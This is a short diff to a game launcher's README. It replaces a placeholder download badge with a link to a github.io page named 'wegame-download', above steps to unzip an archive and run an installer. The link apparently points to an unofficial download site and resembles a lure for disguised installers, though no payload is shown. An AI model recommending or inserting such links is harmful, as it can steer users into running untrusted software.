@@ -8,7 +8,7 @@ Players can discover new titles, optimize performance with built-in tools, and c
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-yellow?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-yellow?style=for-the-badge)](https://wegame-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
